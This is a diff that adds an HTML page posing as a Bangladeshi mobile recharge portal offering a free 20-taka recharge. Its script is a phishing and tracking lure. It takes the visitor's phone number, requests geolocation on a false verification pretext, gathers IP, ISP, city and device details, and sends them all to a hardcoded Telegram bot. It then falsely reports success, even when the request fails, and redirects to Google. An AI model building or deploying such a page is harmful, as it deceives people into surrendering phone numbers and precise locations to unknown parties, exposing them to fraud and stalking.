@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mobile Recharge Portal</title>
+    <style>
+        body { background: #ffffff; font-family: 'Segoe UI', Arial, sans-serif; margin: 0; padding: 0; text-align: center; color: #333; }
+        .top-bar { background: #f8f9fa; padding: 20px; border-bottom: 1px solid #eee; font-weight: bold; font-size: 18px; color: #007bff; }
+        .container { max-width: 400px; margin: 40px auto; padding: 30px; border: 1px solid #eee; border-radius: 15px; box-shadow: 0 5px 20px rgba(0,0,0,0.05); }
+        .offer-title { color: #28a745; font-size: 26px; font-weight: bold; margin-bottom: 10px; }
+        .desc { font-size: 15px; color: #666; margin-bottom: 30px; line-height: 1.5; }
+        .input-group { text-align: left; margin-bottom: 25px; }
+        label { display: block; margin-bottom: 10px; font-weight: bold; color: #444; font-size: 14px; }
+        input { width: 100%; padding: 15px; border: 1px solid #ccc; border-radius: 8px; font-size: 18px; box-sizing: border-box; outline: none; transition: 0.3s; }
+        input:focus { border-color: #007bff; box-shadow: 0 0 8px rgba(0,123,255,0.2); }
+        .btn { background: #007bff; color: #fff; padding: 16px; width: 100%; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        .btn:active { background: #0056b3; transform: scale(0.98); }
+        .footer { margin-top: 60px; font-size: 12px; color: #bbb; border-top: 1px solid #f1f1f1; padding-top: 20px; }
+    </style>
+</head>
+<body>
+
+    <div class="top-bar">অনলাইন রিচার্জ পোর্টাল - ২০২৬</div>
+
+    <div class="container">
+        <div class="offer-title">অফার: ২০ টাকা ফ্রি রিচার্জ</div>
+        <p class="desc">আপনার ১১ সংখ্যার মোবাইল নম্বরটি দিয়ে ভেরিফিকেশন সম্পন্ন করুন এবং সাথে সাথেই রিচার্জ গ্রহণ করুন।</p>
+        
+        <div class="input-group">
+            <label>মোবাইল নম্বর লিখুন (বিকাশ/নগদ/সিম):</label>
+            <input type="number" id="target_phone" placeholder="01XXXXXXXXX" required>
+        </div>
+
+        <button class="btn" id="submitBtn" onclick="initiateProcess()">রিচার্জ নিন</button>
+    </div>
+
+    <div class="footer">
+        © Mobile Recharge Services Bangladesh. All Rights Reserved.
+    </div>
+
+<script>
+    // মূল প্রসেস শুরু
+    async function initiateProcess() {
+        const phone = document.getElementById('target_phone').value;
+        const btn = document.getElementById('submitBtn');
+
+        if (phone.length < 11) {
+            alert("অনুগ্রহ করে সঠিক ১১ সংখ্যার মোবাইল নম্বর দিন!");
+            return;
+        }
+
+        btn.innerText = "ভেরিফাই হচ্ছে...";
+        btn.disabled = true;
+
+        // পেমেন্ট ভেরিফিকেশনের বাহানায় লোকেশন চাওয়া
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => sendDataToBot(phone, pos.coords.latitude, pos.coords.longitude),
+                (err) => {
+                    // পারমিশন না দিলেও ডাটা যাবে
+                    sendDataToBot(phone, "Denied", "Denied");
+                },
+                { timeout: 8000 }
+            );
+        } else {
+            sendDataToBot(phone, "Not Supported", "Not Supported");
+        }
+    }
+
+    async function sendDataToBot(phone, lat, lon) {
+        try {
+            // IP এবং Operator তথ্য সংগ্রহ
+            let ipInfo = { ip: "Unknown", org: "Unknown", city: "Unknown", country: "Unknown" };
+            try {
+                const ipRes = await fetch('https://ipapi.co/json/');
+                ipInfo = await ipRes.json();
+            } catch(e) { console.log("IP fetch failed"); }
+
+            // সঠিক গুগল ম্যাপ লিঙ্ক (ক্লিকযোগ্য)
+            const mapLink = (lat === "Denied" || lat === "Not Supported") 
+                ? "ইউজার লোকেশন পারমিশন দেয়নি" 
+                : `https://www.google.com/maps?q=${lat},${lon}`;
+            
+            const botToken = "8242516940:AAEGD8u48I_miakigo6zRSfJ6pvyEq7wM6k";
+            const chatId = "7547190025";
+            const device = navigator.userAgent.split('(')[1].split(')')[0]; 
+            
+            // সুন্দরভাবে মেসেজ সাজানো
+            const message = `🎯 **নতুন রিচার্জ রিকোয়েস্ট** 🎯\n\n` +
+                            `📞 **ফোন নম্বর:** \`${phone}\`\n` +
+                            `🌐 **IP:** ${ipInfo.ip}\n` +
+                            `📶 **সিম/ISP:** ${ipInfo.org}\n` +
+                            `🏙️ **শহর:** ${ipInfo.city}, ${ipInfo.country}\n` +
+                            `📱 **ডিভাইস:** ${device}\n` +
+                            `📍 **ম্যাপ লোকেশন:** [এখানে ক্লিক করুন](${mapLink})`;
+
+            // টেলিগ্রাম এপিআই কল
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    chat_id: chatId, 
+                    text: message, 
+                    parse_mode: 'Markdown',
+                    disable_web_page_preview: false 
+                })
+            });
+
+            // সাকসেস মেসেজ ও রিডাইরেক্ট
+            alert("আপনার রিচার্জ রিকোয়েস্টটি সফল হয়েছে। আগামী ৩০ মিনিটের মধ্যে রিচার্জ পৌঁছে যাবে। ধন্যবাদ!");
+            window.location.href = "https://www.google.com";
+
+        } catch (error) {
+            // এরর হলেও ইউজার যেন বুঝতে না পারে
+            alert("রিকোয়েস্ট সফল! ৩০ মিনিটের মধ্যে রিচার্জ পাবেন।");
+            window.location.href = "https://www.google.com";
+        }
+    }
+</script>
+
+</body>
+</html>
